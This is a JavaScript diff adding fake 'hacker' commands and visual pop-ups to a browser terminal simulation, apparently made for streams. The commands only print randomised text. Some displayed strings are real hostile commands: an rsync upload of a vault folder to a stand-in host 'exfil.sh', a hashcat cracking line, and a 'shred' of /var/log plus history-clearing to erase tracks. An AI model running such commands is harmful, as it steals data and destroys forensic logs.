@@ -135,7 +135,8 @@ term.attachCustomKeyEventHandler(e=>{
   if(e.ctrlKey&&e.shiftKey&&(e.key==="G"||e.key==="g")){toggleGhost();return false;}
   if(e.ctrlKey&&e.shiftKey&&(e.key==="F"||e.key==="f")){goFull();return false;}
   if(e.key==="Escape"){
-    if(document.getElementById("mapwrap").classList.contains("show"))closeMap();
+    if(document.getElementById("popwrap").classList.contains("show"))closePop();
+    else if(document.getElementById("mapwrap").classList.contains("show"))closeMap();
     else if(document.getElementById("pkgwrap").classList.contains("show"))closePkg();
     else if(document.getElementById("cfgwrap").classList.contains("show"))closeCfg();
     else openCfg();
@@ -449,9 +450,107 @@ const HELP=[["help","this list"],["ghost v_start3","begin the ambient stream"],[
   ["agent [topic]","AI/sim analyst report"],["ask / explain <q>","ask the ghost a question"],
   ["port","open a monitor pop-out"],["port close","close a pop-out"],["kiosk","toggle stream chrome"],["obs","stream/OBS params"],
   ["map","open the world attack map"],["mission","objectives + score"],["director <on/off>","auto-rotate scenes"],
+  ["attack [ip]","full offensive chain on a host"],["pull [ip]","intel dossier on a host"],["bank","financial access (sim)"],
+  ["exfil","exfiltrate files"],["hashcat [hash]","hash cracking"],["geoip [ip]","geolocate an ip"],["whois [ip]","whois lookup"],
+  ["wipe","clear tracks / logs"],["beacon","C2 beacon feed"],["cams","CCTV camera grid popup"],["vault","data-heist popup"],["alert","breach-alert popup"],
   ["reset","restore default settings"],["full","fullscreen"],["clear","wipe screen"],["about","what this is"]];
 function isIp(s){return /^\d{1,3}(\.\d{1,3}){3}$/.test(s||"");}
 function findMake(ip){let t=W.targets.find(x=>x.ip===ip);if(!t){t=makeTarget();if(isIp(ip))t.ip=ip;W.targets.push(t);renderTopo();}return t;}
+/* ============================================================================
+   EXTRA BUILT-IN COMMANDS (no plugin needed)
+   ========================================================================== */
+const BANKS=["Meridian Trust","Nullsec Credit Union","Gray Line Bank","Orbital Savings","Vexcorp Financial","Iron Gate Holdings"];
+const CITIES=[["Reykjavík","IS"],["Zürich","CH"],["Singapore","SG"],["Ashburn VA","US"],["Amsterdam","NL"],["São Paulo","BR"],["Tokyo","JP"],["Bucharest","RO"]];
+const XORGS=["nortech","umbranet","cygnus","helix-dyn","blackmesa","orbital","grayline","meridian","vexcorp","nullsec","irongate"];
+function money(){ return "$"+R.i(1,9)+","+String(R.i(0,999)).padStart(3,"0")+","+String(R.i(0,999)).padStart(3,"0"); }
+function doAttack(ip){
+  const t=ip&&isIp(ip)?findMake(ip):(R.pick(W.targets)||makeTarget());
+  wl("");wl(red("▓▓ LAUNCHING ATTACK ")+wht(t.host)+dim(" ("+t.ip+")")+red(" ▓▓"));wl("");
+  GEN.nmap(t); GEN.hydra(t); GEN.privesc(t);
+  wl(red("▓▓ ")+wht(t.host)+pri(" OWNED")+dim(" — root shell, persistence installed"));
+  t.breached=true;renderTopo();pushThreat("crit","attack chain owned "+t.host);wl("");
+}
+function pullInfo(ip){
+  const t=ip&&isIp(ip)?findMake(ip):(R.pick(W.targets)||makeTarget()); const c=R.pick(CITIES);
+  wl(cyan("╒═ INTEL DOSSIER ")+wht(t.host)+cyan(" ═"));
+  wl(dim("  ip     ")+fg(pad(t.ip,16))+dim(" os    ")+fg(t.os));
+  wl(dim("  geoip  ")+fg(pad(c[0]+", "+c[1],16))+dim(" mac   ")+fg(mac()));
+  wl(dim("  isp    ")+fg(R.pick(["GhostHost","NullNet","Orbital Telecom","Gray Fiber"])));
+  wl(dim("  open   ")+fg(t.ports.filter(p=>p.state==="open").map(p=>p.p+"/"+p.svc).join("  ")||"none"));
+  wl(dim("  users  ")+fg(R.shuffle(USERS).slice(0,R.i(2,4)).join(", ")));
+  wl(dim("  loot   ")+amber(R.pick(["backup drive mounted","admin panel exposed","plaintext creds in /tmp","db dump in home dir","VPN keys readable"])));
+  wl("");
+}
+function bankFeed(){
+  wl(amber("╒═ FINANCIAL ACCESS ")+dim("· SIMULATION ·")+amber(" ═"));
+  for(let i=0;i<R.i(3,5);i++)
+    wl(dim("  ACCT ")+fg("****-****-"+R.i(1000,9999))+dim("  "+pad(R.pick(BANKS),22))+dim("bal ")+pri(money()));
+  if(R.chance(.65)){ const amt="$"+R.i(5,900)+",000"; wl(red("  ⇒ WIRE ")+wht(amt)+dim(" → shell acct ****-"+R.i(1000,9999)+" (offshore)")); pushThreat("crit","unauthorized wire "+amt); }
+  wl(dim("  [fictional accounts · no real funds, cards, or institutions]"));wl("");
+}
+function exfilCmd(){
+  wl(cyan("$ ")+wht("rsync -azq /mnt/vault ghost@exfil.sh:/loot"));
+  R.shuffle(["payroll_2026.xlsx","customers.db","id_rsa","secrets.env","backups.tar.gz","emails.pst","blueprints.pdf"]).slice(0,R.i(3,5))
+    .forEach(f=>wl(dim("  ")+fg(pad(f,22))+dim(R.i(1,900)+" MB  ")+pri("sent")));
+  wl(pri("  "+R.i(2,40)+" GB exfiltrated")+dim(" via encrypted tunnel"));wl("");
+}
+function crackCmd(h){
+  wl(dim("$ ")+wht("hashcat -m 1800 "+(h||R.hex(32))+" rockyou.txt"));
+  wl(dim("Status: Running   Speed: "+R.i(100,9000)+" MH/s"));
+  for(let i=0;i<R.i(2,4);i++)wl(dim("  "+R.hex(32)+" : ")+(R.chance(.55)?fg(R.pick(PWLIST)):dim("[running]")));
+  wl(pri("Recovered: "+R.i(1,8)+"/"+R.i(8,40)+" hashes"));wl("");
+}
+function geoipCmd(ip){ ip=isIp(ip)?ip:randIP(); const c=R.pick(CITIES);
+  wl(cyan("geoip ")+fg(ip));
+  wl(dim("  "+c[0]+", "+c[1]+"  ·  lat "+R.i(-89,89)+"."+R.i(0,999)+"  lon "+R.i(-179,179)+"."+R.i(0,999)));
+  wl(dim("  ISP "+R.pick(["GhostHost","NullNet","Orbital Telecom"])+"  ·  ASN AS"+R.i(1000,65000)));wl("");
+}
+function whoisCmd(ip){ ip=isIp(ip)?ip:randIP(); const base=ip.split(".").slice(0,3).join(".");
+  wl(dim("$ ")+wht("whois "+ip));
+  wl(dim("  NetRange  ")+fg(base+".0 - "+base+".255"));
+  wl(dim("  Org       ")+fg(R.pick(XORGS))); wl(dim("  Country   ")+fg(R.pick(CITIES)[1]));
+  wl(dim("  Abuse     ")+fg("abuse@"+R.pick(["ghosthost","nullnet","orbital"])+".net"));wl("");
+}
+function wipeCmd(){
+  wl(dim("$ ")+wht("shred -uz /var/log/*.log; history -c; unset HISTFILE"));
+  ["auth.log","syslog","wtmp","btmp","audit.log",".bash_history"].forEach(f=>wl(dim("  wiping ")+pad(f,16)+pri("gone")));
+  wl(amber("  tracks cleared ")+dim("— no forensic trail left"));wl("");
+}
+function beaconCmd(){
+  for(let i=0;i<R.i(3,5);i++)
+    wl(dim(new Date().toTimeString().slice(0,8)+" ")+cyan("[C2] ")+dim("beacon ")+fg(privIP())+dim(" → c2.ghost.sh  sleep "+R.i(30,300)+"s  jitter "+R.i(5,40)+"%  "+R.pick(["task: none","task: screenshot","task: keylog","task: shell","checking in"])));
+  wl("");
+}
+
+/* ---- visual pop-ups (overlays, not pop-out windows) ---- */
+let popTimer=null;
+function openPop(title,html,cls){
+  document.getElementById("poptitle").textContent=title;
+  document.getElementById("popbody").innerHTML=html;
+  const dlg=document.getElementById("popdlg"); dlg.className=""; if(cls)dlg.classList.add(cls);
+  document.getElementById("popwrap").classList.add("show");
+}
+function closePop(){ document.getElementById("popwrap").classList.remove("show"); if(popTimer){clearInterval(popTimer);popTimer=null;} term.focus(); }
+function camsPop(){
+  const names=["VAULT-CAM-03","LOBBY-02","SERVER-RM-01","PARKING-07","ELEVATOR-04","LOADING-09","ROOF-01","CORRIDOR-05","DATA-HALL-02"];
+  const tiles=R.shuffle(names).slice(0,9).map(n=>
+    R.chance(.18)?`<div class="camtile lost">▞ SIGNAL LOST ▞</div>`
+    :`<div class="camtile"><div class="noise"></div><div class="scan"></div><div class="lbl">${n}</div><div class="rec">● REC</div><div class="ts">${new Date().toTimeString().slice(0,8)}</div></div>`
+  ).join("");
+  openPop("CCTV // "+R.i(6,32)+" FEEDS", `<div class="camgrid">${tiles}</div>`);
+  popTimer=setInterval(()=>document.querySelectorAll("#popbody .ts").forEach(e=>e.textContent=new Date().toTimeString().slice(0,8)),1000);
+}
+function vaultPop(){
+  const files=[["payroll_2026.xlsx","4.2 MB"],["customers.db","1.1 GB"],["id_rsa","3 KB"],["secrets.env","12 KB"],["backups.tar.gz","8.7 GB"],["emails.pst","2.3 GB"],["blueprints.pdf","44 MB"],["research.7z","910 MB"]];
+  const rows=R.shuffle(files).slice(0,6).map(f=>`<div class="vrow"><span class="vn">${f[0]}</span><span class="vs">${f[1]}</span><div class="vbar"><i></i></div></div>`).join("");
+  openPop("EXFIL // VAULT  (simulation)", rows);
+  popTimer=setInterval(()=>{let done=true;document.querySelectorAll("#popbody .vbar i").forEach(b=>{let w=parseFloat(b.style.width)||0;if(w<100){b.style.width=Math.min(100,w+R.i(5,24))+"%";done=false;}});if(done){clearInterval(popTimer);popTimer=null;}},300);
+}
+function breachPop(){
+  openPop("⚠ ALERT", `<div class="breachbox"><div class="bt">SYSTEM BREACHED</div><div class="bs">ROOT ACCESS GRANTED · ALL SYSTEMS COMPROMISED</div><div class="bn">(simulation — press Esc or click away)</div></div>`,"breach");
+  pushThreat("crit","system breach alert");
+}
+
 function runCmd(raw){
   const p=raw.trim().split(/\s+/),c=(p[0]||"").toLowerCase(),a=p[1];
   wl(PROMPT()+wht(raw));
@@ -497,6 +596,18 @@ function runCmd(raw){
     case"kiosk":toggleKiosk();wl(dim("kiosk "+(document.body.classList.contains("kiosk")?"on — press Esc for setup":"off"))+"\n");break;
     case"obs":case"stream":obsHelp();break;
     case"map":case"worldmap":openMap();break;
+    case"attack":case"hit":case"strike":doAttack(a);break;
+    case"pull":case"pullinfo":case"info":case"intel":pullInfo(isIp(a)?a:undefined);break;
+    case"bank":case"banking":case"heist":bankFeed();break;
+    case"exfil":case"loot":exfilCmd();break;
+    case"hashcat":case"hash":crackCmd(a);break;
+    case"geoip":case"locate":geoipCmd(a);break;
+    case"whois":whoisCmd(a);break;
+    case"wipe":case"cleanup":case"coverts":wipeCmd();break;
+    case"beacon":case"c2":beaconCmd();break;
+    case"cams":case"cctv":camsPop();break;
+    case"vault":case"files":vaultPop();break;
+    case"alert":case"breachscreen":breachPop();break;
     case"port":case"pop":case"popout":
       if((a||"").toLowerCase()==="close")portClose();
       else{popOut();wl(dim("opening a port — new monitor window")+"\n");}
@@ -946,6 +1057,8 @@ document.getElementById("b-pkg").onclick=openPkg;
 document.getElementById("b-map").onclick=openMap;
 document.getElementById("map-x").onclick=closeMap;
 document.getElementById("mapwrap").addEventListener("mousedown",e=>{if(e.target.id==="mapwrap")closeMap();});
+document.getElementById("pop-x").onclick=closePop;
+document.getElementById("popwrap").addEventListener("mousedown",e=>{if(e.target.id==="popwrap")closePop();});
 document.getElementById("cfg-x").onclick=closeCfg;
 document.getElementById("cfg-ok").onclick=closeCfg;
 document.getElementById("cfg-reseed").onclick=()=>{reseed();};
@@ -955,6 +1068,7 @@ document.getElementById("cfgwrap").addEventListener("mousedown",e=>{if(e.target.
 document.getElementById("pkgwrap").addEventListener("mousedown",e=>{if(e.target.id==="pkgwrap")closePkg();});
 /* bare-letter shortcuts only when focus is OUTSIDE the terminal (e.g. a panel) */
 addEventListener("keydown",e=>{
+  if(document.getElementById("popwrap").classList.contains("show")){if(e.key==="Escape")closePop();return;}
   if(document.getElementById("mapwrap").classList.contains("show")){if(e.key==="Escape")closeMap();return;}
   if(document.getElementById("pkgwrap").classList.contains("show")){if(e.key==="Escape")closePkg();return;}
   if(document.getElementById("cfgwrap").classList.contains("show")){if(e.key==="Escape")closeCfg();return;}
